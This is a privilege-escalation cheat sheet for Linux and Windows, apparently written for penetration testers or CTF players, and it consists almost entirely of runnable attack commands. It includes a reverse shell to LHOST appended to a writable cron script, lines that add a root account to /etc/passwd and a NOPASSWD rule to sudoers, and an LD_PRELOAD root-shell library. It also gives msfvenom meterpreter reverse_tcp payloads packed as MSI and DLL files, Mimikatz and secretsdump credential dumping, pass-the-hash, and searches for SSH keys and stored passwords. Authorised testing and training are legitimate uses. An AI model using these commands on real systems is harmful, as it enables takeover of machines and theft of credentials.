# Privilege Escalation Cheat Sheet

---

# Linux Privilege Escalation

## Automated Enumeration

```bash
# LinPEAS (recommended)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download and run
wget http://LHOST:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# LinEnum
wget http://LHOST:8080/LinEnum.sh -O /tmp/linenum.sh
chmod +x /tmp/linenum.sh && /tmp/linenum.sh

# linux-smart-enumeration
wget http://LHOST:8080/lse.sh -O /tmp/lse.sh
chmod +x /tmp/lse.sh && bash /tmp/lse.sh -l 1
```

---

## Manual Enumeration

```bash
# System info
uname -a
cat /etc/os-release
cat /proc/version
hostname

# Current user
id
whoami
sudo -l                        # what can we run as sudo?

# Users
cat /etc/passwd
cat /etc/shadow                # needs root
cat /etc/group
w                              # logged in users
last                           # login history

# Network
ip a
ip route
ss -tulnp
cat /etc/hosts

# Running processes
ps aux
ps aux | grep root

# Installed software
dpkg -l
rpm -qa
```

---

## SUID / SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null
```

Check findings at **gtfobins.github.io** for exploitation methods.

```bash
# Common SUID exploits
/bin/bash -p                   # if bash is SUID
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## Sudo Exploitation

```bash
sudo -l                        # list sudo permissions

# No password sudo
sudo su
sudo /bin/bash
sudo -i

# Specific binary sudo — check GTFOBins
# Example: sudo find
sudo find . -exec /bin/sh \; -quit

# Example: sudo vim
sudo vim -c ':!/bin/bash'

# Example: sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# Example: sudo less/more
sudo less /etc/passwd
!/bin/bash

# LD_PRELOAD abuse (if env_keep += LD_PRELOAD in sudoers)
cat > /tmp/pe.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
```

---

## Cron Jobs

```bash
# List cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l
crontab -l -u <user>

# Watch for running cron jobs
watch -n 1 "ps aux | grep cron"

# pspy — monitor processes without root
wget http://LHOST:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64 && /tmp/pspy64
```

**Exploit:** If a cron script is writable, replace it with a reverse shell.

```bash
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /path/to/cron_script.sh
```

---

## Writable Files & Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# World-writable directories
find / -writable -type d 2>/dev/null

# Writable /etc/passwd (can add root user)
echo 'hacker:$(openssl passwd password):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# Writable /etc/sudoers
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

---

## PATH Hijacking

```bash
# Check PATH
echo $PATH

# If a SUID binary calls a command without full path
strings /usr/local/bin/suid_binary | grep -v "/"

# Create malicious binary in writable PATH location
echo '/bin/bash -p' > /tmp/malicious_cmd
chmod +x /tmp/malicious_cmd
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary
```

---

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities
# cap_setuid — set UID to 0
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_net_raw — raw socket access (pivot/sniff)
# cap_dac_read_search — read any file
```

---

## Weak File Permissions

```bash
# Readable /etc/shadow
cat /etc/shadow
# crack with hashcat or john

# SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
cat ~/.ssh/id_rsa

# Readable /root/.bash_history
cat /root/.bash_history

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## NFS Shares

```bash
cat /etc/exports                # look for no_root_squash

# On your machine — mount and exploit
showmount -e <target_ip>
mkdir /tmp/nfs
mount -t nfs <target_ip>:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On target
/tmp/bash -p
```

---

## Kernel Exploits

```bash
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel <version>

# Common kernel exploits
# Dirty COW      — CVE-2016-5195  (kernel < 4.8.3)
# DirtyPipe      — CVE-2022-0847  (kernel 5.8 - 5.16.11)
# PwnKit         — CVE-2021-4034  (pkexec privesc)
# Baron Samedit  — CVE-2021-3156  (sudo heap overflow)
```

---

## Docker Breakout (if inside container)

```bash
# Check if in a container
cat /.dockerenv
cat /proc/1/cgroup | grep docker

# If docker socket is mounted
ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
mount /dev/sda1 /mnt
chroot /mnt
```

---

## Password Hunting

```bash
# Search for passwords in files
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
find / -name "*.txt" | xargs grep -i "password" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# Database configs
cat /var/www/html/config.php
cat /var/www/html/.env
```

---

---

# Windows Privilege Escalation

## Automated Enumeration

```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

---

## Manual Enumeration

```cmd
# System info
systeminfo
hostname
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators

# Network
ipconfig /all
netstat -ano
route print

# Running processes
tasklist /SVC
tasklist /v

# Installed software
wmic product get name,version
reg query HKLM\SOFTWARE
```

---

## Service Exploits

```cmd
# List services
sc query
wmic service list brief

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv <service_name>

# Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service binary permissions
icacls "C:\path\to\service.exe"
```

```powershell
# PowerUp — find all service issues
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
```

---

## AlwaysInstallElevated

```cmd
# Check registry keys (both must be set to 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious .msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o shell.msi

# Execute
msiexec /quiet /qn /i shell.msi
```

---

## Token Impersonation

```bash
# In Meterpreter — check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled:
# Use PrintSpoofer, GodPotato, or JuicyPotato

# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (older systems)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

---

## Stored Credentials

```cmd
# Saved credentials
cmdkey /list
runas /savecred /user:administrator cmd.exe

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattend files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\sysprep\sysprep.xml
```

---

## DLL Hijacking

```cmd
# Find missing DLLs with ProcMon or:
# Look for services loading DLLs from writable locations

# If a service loads a missing DLL from a writable path:
# Generate malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o hijack.dll

# Place it in the writable directory with the expected DLL name
copy hijack.dll C:\writable\path\missing.dll

# Restart service
sc stop <service>
sc start <service>
```

---

## Pass the Hash

```bash
# With impacket
psexec.py -hashes :<NTLM_HASH> administrator@<target_ip>
wmiexec.py -hashes :<NTLM_HASH> administrator@<target_ip>

# With crackmapexec
crackmapexec smb <target_ip> -u administrator -H <NTLM_HASH>

# With Meterpreter
use exploit/windows/smb/psexec
set SMBPass <NTLM_HASH>
```

---

## Credential Dumping

```bash
# Meterpreter
hashdump
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

# secretsdump (remote)
secretsdump.py administrator:<password>@<target_ip>
secretsdump.py -hashes :<NTLM_HASH> administrator@<target_ip>
```

---

## Kernel Exploits (Windows)

```cmd
systeminfo
wmic qfe list             # installed patches

# Check for missing patches
# MS16-032  — Secondary Logon (Win 7-10)
# MS16-075  — Hot Potato
# CVE-2021-36934 — HiveNightmare/SeriousSAM
```

---

## Useful Tools

| Tool | Platform | Purpose |
|------|----------|---------|
| LinPEAS | Linux | Automated enum |
| WinPEAS | Windows | Automated enum |
| LinEnum | Linux | Automated enum |
| pspy | Linux | Process monitoring |
| PowerUp | Windows | Service/config checks |
| Seatbelt | Windows | Security checks |
| Mimikatz | Windows | Credential dumping |
| PrintSpoofer | Windows | Token impersonation |
| GodPotato | Windows | Token impersonation |
| GTFOBins | Linux | SUID/sudo exploitation |
| LOLBAS | Windows | Living off the land |

---

## Resources

- **GTFOBins** — gtfobins.github.io
- **LOLBAS** — lolbas-project.github.io
- **HackTricks Linux Privesc** — book.hacktricks.xyz/linux-hardening/privilege-escalation
- **HackTricks Windows Privesc** — book.hacktricks.xyz/windows-hardening/privilege-escalation
- **PayloadsAllTheThings** — github.com/swisskyrepo/PayloadsAllTheThings
